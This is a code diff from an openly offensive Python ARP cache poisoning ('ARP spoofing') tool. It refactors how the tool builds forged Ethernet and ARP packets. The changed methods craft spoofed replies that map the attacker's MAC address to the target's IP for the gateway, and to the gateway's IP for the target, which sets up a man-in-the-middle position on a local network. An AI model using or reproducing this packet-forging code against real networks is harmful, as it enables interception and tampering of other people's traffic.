@@ -3,17 +3,12 @@
 
 __author__ = 'EONRaider @ keybase.io/eonraider'
 
-"""
-A low-level ARP Cache Poisoning (a.k.a "ARP Spoofing") tool.
-"""
-
 import argparse
 import random
 import time
-from functools import partial
 from socket import htons, ntohs, socket, PF_PACKET, SOCK_RAW
 
-from protocols import ARP, Ethernet
+from protocols import ARP, Ethernet, Packet
 
 
 class AttackPackets(object):
@@ -24,7 +19,6 @@ class AttackPackets(object):
         self.gateway_ip = gateway_ip
         self.target_mac = target_mac
         self.target_ip = target_ip
-        self.eth_frame = partial(Ethernet, src=self.attacker_mac, eth=0x0806)
         self.payloads = self.payload_to_gateway, self.payload_to_target
 
     def __iter__(self):
@@ -32,17 +26,19 @@ class AttackPackets(object):
 
     @property
     def payload_to_gateway(self):
-        eth_frame_to_gateway = self.eth_frame(dst=self.gateway_mac)
-        arp_pkt_to_gateway = ARP(sha=self.attacker_mac, spa=self.target_ip,
-                                 tha=self.gateway_mac, tpa=self.gateway_ip)
-        return bytes(eth_frame_to_gateway) + bytes(arp_pkt_to_gateway)
+        gateway = Packet(Ethernet(dst=self.gateway_mac, src=self.attacker_mac,
+                                  eth=0x0806),
+                         ARP(sha=self.attacker_mac, spa=self.target_ip,
+                             tha=self.gateway_mac, tpa=self.gateway_ip))
+        return gateway.payload
 
     @property
     def payload_to_target(self):
-        eth_frame_to_target = self.eth_frame(dst=self.target_mac)
-        arp_pkt_to_target = ARP(sha=self.attacker_mac, spa=self.gateway_ip,
-                                tha=self.target_mac, tpa=self.target_ip)
-        return bytes(eth_frame_to_target) + bytes(arp_pkt_to_target)
+        target = Packet(Ethernet(dst=self.target_mac, src=self.attacker_mac,
+                                 eth=0x0806),
+                        ARP(sha=self.attacker_mac, spa=self.gateway_ip,
+                            tha=self.target_mac, tpa=self.target_ip))
+        return target.payload
 
 
 class Spoofer(object):
